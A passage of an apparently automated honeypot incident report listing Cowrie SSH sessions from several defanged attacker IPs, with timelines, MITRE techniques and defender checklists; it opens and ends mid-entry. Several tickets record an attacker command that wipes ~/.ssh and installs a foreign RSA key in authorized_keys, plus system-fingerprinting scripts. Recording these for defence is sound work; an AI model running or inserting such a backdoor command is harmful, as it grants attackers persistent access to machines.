| `2026-09-10 19:44:51` | `cowrie.command.input` |
| `2026-09-10 19:44:51` | `cowrie.log.closed` |
| `2026-09-10 19:44:52` | `cowrie.session.params` |
| `2026-09-10 19:44:52` | `cowrie.command.input` |
| `2026-09-10 19:44:52` | `cowrie.log.closed` |
| `2026-09-10 19:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5e18030104a

| Field | Detail |
|---|---|
| **Source IP** | `5.188.3[.]243` |
| **First Seen** | 2026-09-10 19:44 |
| **Last Seen** | 2026-09-10 19:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:44:54` | `cowrie.session.connect` |
| `2026-09-10 19:44:54` | `cowrie.client.version` |
| `2026-09-10 19:44:55` | `cowrie.client.kex` |
| `2026-09-10 19:44:56` | `cowrie.login.success` |
| `2026-09-10 19:44:57` | `cowrie.session.params` |
| `2026-09-10 19:44:57` | `cowrie.command.input` |
| `2026-09-10 19:44:57` | `cowrie.command.failed` |
| `2026-09-10 19:44:57` | `cowrie.log.closed` |
| `2026-09-10 19:44:58` | `cowrie.session.params` |
| `2026-09-10 19:44:58` | `cowrie.command.input` |
| `2026-09-10 19:44:58` | `cowrie.session.file_download` |
| `2026-09-10 19:44:58` | `cowrie.log.closed` |
| `2026-09-10 19:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.188.3[.]243` to AbuseIPDB if not already reported
- [ ] Block `5.188.3[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1caf5aa8c404

| Field | Detail |
|---|---|
| **Source IP** | `5.188.3[.]243` |
| **First Seen** | 2026-09-10 19:44 |
| **Last Seen** | 2026-09-10 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:44:58` | `cowrie.session.connect` |
| `2026-09-10 19:44:58` | `cowrie.client.version` |
| `2026-09-10 19:44:59` | `cowrie.client.kex` |
| `2026-09-10 19:45:00` | `cowrie.login.success` |
| `2026-09-10 19:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.188.3[.]243` to AbuseIPDB if not already reported
- [ ] Block `5.188.3[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c3f46920ebc

| Field | Detail |
|---|---|
| **Source IP** | `5.188.3[.]243` |
| **First Seen** | 2026-09-10 19:45 |
| **Last Seen** | 2026-09-10 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:45:00` | `cowrie.session.connect` |
| `2026-09-10 19:45:00` | `cowrie.client.version` |
| `2026-09-10 19:45:00` | `cowrie.client.kex` |
| `2026-09-10 19:45:01` | `cowrie.login.success` |
| `2026-09-10 19:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.188.3[.]243` to AbuseIPDB if not already reported
- [ ] Block `5.188.3[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8d66c51c969

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:46 |
| **Last Seen** | 2026-09-10 19:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:46:45` | `cowrie.session.connect` |
| `2026-09-10 19:46:45` | `cowrie.client.version` |
| `2026-09-10 19:46:45` | `cowrie.client.kex` |
| `2026-09-10 19:46:46` | `cowrie.login.success` |
| `2026-09-10 19:46:47` | `cowrie.session.params` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.command.success` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.command.input` |
| `2026-09-10 19:46:47` | `cowrie.log.closed` |
| `2026-09-10 19:46:48` | `cowrie.session.params` |
| `2026-09-10 19:46:48` | `cowrie.command.input` |
| `2026-09-10 19:46:48` | `cowrie.log.closed` |
| `2026-09-10 19:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e93900be0c

| Field | Detail |
|---|---|
| **Source IP** | `103.241.43[.]193` |
| **First Seen** | 2026-09-10 19:47 |
| **Last Seen** | 2026-09-10 19:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:47:05` | `cowrie.session.connect` |
| `2026-09-10 19:47:05` | `cowrie.client.version` |
| `2026-09-10 19:47:06` | `cowrie.client.kex` |
| `2026-09-10 19:47:07` | `cowrie.login.success` |
| `2026-09-10 19:47:08` | `cowrie.session.params` |
| `2026-09-10 19:47:08` | `cowrie.command.input` |
| `2026-09-10 19:47:08` | `cowrie.command.failed` |
| `2026-09-10 19:47:08` | `cowrie.log.closed` |
| `2026-09-10 19:47:09` | `cowrie.session.params` |
| `2026-09-10 19:47:09` | `cowrie.command.input` |
| `2026-09-10 19:47:09` | `cowrie.session.file_download` |
| `2026-09-10 19:47:09` | `cowrie.log.closed` |
| `2026-09-10 19:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.241.43[.]193` to AbuseIPDB if not already reported
- [ ] Block `103.241.43[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2e8c14cf0a

| Field | Detail |
|---|---|
| **Source IP** | `103.241.43[.]193` |
| **First Seen** | 2026-09-10 19:47 |
| **Last Seen** | 2026-09-10 19:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:47:10` | `cowrie.session.connect` |
| `2026-09-10 19:47:10` | `cowrie.client.version` |
| `2026-09-10 19:47:10` | `cowrie.client.kex` |
| `2026-09-10 19:47:11` | `cowrie.login.success` |
| `2026-09-10 19:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.241.43[.]193` to AbuseIPDB if not already reported
- [ ] Block `103.241.43[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de5fd7695a83

| Field | Detail |
|---|---|
| **Source IP** | `103.241.43[.]193` |
| **First Seen** | 2026-09-10 19:47 |
| **Last Seen** | 2026-09-10 19:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:47:11` | `cowrie.session.connect` |
| `2026-09-10 19:47:11` | `cowrie.client.version` |
| `2026-09-10 19:47:12` | `cowrie.client.kex` |
| `2026-09-10 19:47:13` | `cowrie.login.success` |
| `2026-09-10 19:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.241.43[.]193` to AbuseIPDB if not already reported
- [ ] Block `103.241.43[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b71b17ea6b0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:48 |
| **Last Seen** | 2026-09-10 19:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:48:31` | `cowrie.session.connect` |
| `2026-09-10 19:48:31` | `cowrie.client.version` |
| `2026-09-10 19:48:31` | `cowrie.client.kex` |
| `2026-09-10 19:48:32` | `cowrie.login.success` |
| `2026-09-10 19:48:33` | `cowrie.session.params` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:33` | `cowrie.command.success` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:33` | `cowrie.command.input` |
| `2026-09-10 19:48:34` | `cowrie.log.closed` |
| `2026-09-10 19:48:35` | `cowrie.session.params` |
| `2026-09-10 19:48:35` | `cowrie.command.input` |
| `2026-09-10 19:48:35` | `cowrie.log.closed` |
| `2026-09-10 19:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cbafc004819

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-10 19:48 |
| **Last Seen** | 2026-09-10 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:48:53` | `cowrie.session.connect` |
| `2026-09-10 19:48:53` | `cowrie.client.version` |
| `2026-09-10 19:48:53` | `cowrie.client.kex` |
| `2026-09-10 19:48:53` | `cowrie.login.success` |
| `2026-09-10 19:48:53` | `cowrie.direct-tcpip.request` |
| `2026-09-10 19:48:53` | `cowrie.direct-tcpip.data` |
| `2026-09-10 19:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541937c3ea60

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-10 19:48 |
| **Last Seen** | 2026-09-10 19:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:48:54` | `cowrie.session.connect` |
| `2026-09-10 19:48:54` | `cowrie.client.version` |
| `2026-09-10 19:48:54` | `cowrie.client.kex` |
| `2026-09-10 19:48:55` | `cowrie.login.success` |
| `2026-09-10 19:48:58` | `cowrie.direct-tcpip.request` |
| `2026-09-10 19:49:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 19:49:01` | `cowrie.direct-tcpip.data` |
| `2026-09-10 19:49:01` | `cowrie.direct-tcpip.request` |
| `2026-09-10 19:49:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 19:49:01` | `cowrie.direct-tcpip.data` |
| `2026-09-10 19:49:01` | `cowrie.direct-tcpip.request` |
| `2026-09-10 19:49:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 19:49:01` | `cowrie.direct-tcpip.data` |
| `2026-09-10 19:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3533c0b031

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:50 |
| **Last Seen** | 2026-09-10 19:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:50:21` | `cowrie.session.connect` |
| `2026-09-10 19:50:22` | `cowrie.client.version` |
| `2026-09-10 19:50:22` | `cowrie.client.kex` |
| `2026-09-10 19:50:23` | `cowrie.login.success` |
| `2026-09-10 19:50:24` | `cowrie.session.params` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.command.success` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.command.input` |
| `2026-09-10 19:50:24` | `cowrie.log.closed` |
| `2026-09-10 19:50:25` | `cowrie.session.params` |
| `2026-09-10 19:50:25` | `cowrie.command.input` |
| `2026-09-10 19:50:26` | `cowrie.log.closed` |
| `2026-09-10 19:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3aa15ff5261

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-10 19:50 |
| **Last Seen** | 2026-09-10 19:50 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:50:31` | `cowrie.session.connect` |
| `2026-09-10 19:50:31` | `cowrie.client.version` |
| `2026-09-10 19:50:31` | `cowrie.client.kex` |
| `2026-09-10 19:50:32` | `cowrie.login.success` |
| `2026-09-10 19:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb24ea7611e4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:52 |
| **Last Seen** | 2026-09-10 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:52:19` | `cowrie.session.connect` |
| `2026-09-10 19:52:19` | `cowrie.client.version` |
| `2026-09-10 19:52:19` | `cowrie.client.kex` |
| `2026-09-10 19:52:20` | `cowrie.login.success` |
| `2026-09-10 19:52:20` | `cowrie.session.params` |
| `2026-09-10 19:52:20` | `cowrie.command.input` |
| `2026-09-10 19:52:20` | `cowrie.command.input` |
| `2026-09-10 19:52:20` | `cowrie.command.input` |
| `2026-09-10 19:52:20` | `cowrie.command.input` |
| `2026-09-10 19:52:20` | `cowrie.command.input` |
| `2026-09-10 19:52:20` | `cowrie.command.success` |
| `2026-09-10 19:52:20` | `cowrie.command.input` |
| `2026-09-10 19:52:20` | `cowrie.command.input` |
| `2026-09-10 19:52:20` | `cowrie.command.input` |
| `2026-09-10 19:52:21` | `cowrie.command.input` |
| `2026-09-10 19:52:21` | `cowrie.log.closed` |
| `2026-09-10 19:52:22` | `cowrie.session.params` |
| `2026-09-10 19:52:22` | `cowrie.command.input` |
| `2026-09-10 19:52:22` | `cowrie.log.closed` |
| `2026-09-10 19:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71843a452ab4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:54 |
| **Last Seen** | 2026-09-10 19:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:54:11` | `cowrie.session.connect` |
| `2026-09-10 19:54:11` | `cowrie.client.version` |
| `2026-09-10 19:54:11` | `cowrie.client.kex` |
| `2026-09-10 19:54:13` | `cowrie.login.success` |
| `2026-09-10 19:54:14` | `cowrie.session.params` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:14` | `cowrie.command.success` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:14` | `cowrie.command.input` |
| `2026-09-10 19:54:15` | `cowrie.log.closed` |
| `2026-09-10 19:54:16` | `cowrie.session.params` |
| `2026-09-10 19:54:16` | `cowrie.command.input` |
| `2026-09-10 19:54:17` | `cowrie.log.closed` |
| `2026-09-10 19:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5631b978d76a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:55 |
| **Last Seen** | 2026-09-10 19:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:55:56` | `cowrie.session.connect` |
| `2026-09-10 19:55:56` | `cowrie.client.version` |
| `2026-09-10 19:55:56` | `cowrie.client.kex` |
| `2026-09-10 19:55:57` | `cowrie.login.success` |
| `2026-09-10 19:55:58` | `cowrie.session.params` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:58` | `cowrie.command.success` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:58` | `cowrie.command.input` |
| `2026-09-10 19:55:59` | `cowrie.log.closed` |
| `2026-09-10 19:56:00` | `cowrie.session.params` |
| `2026-09-10 19:56:00` | `cowrie.command.input` |
| `2026-09-10 19:56:01` | `cowrie.log.closed` |
| `2026-09-10 19:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a16cc632df9f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:57 |
| **Last Seen** | 2026-09-10 19:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
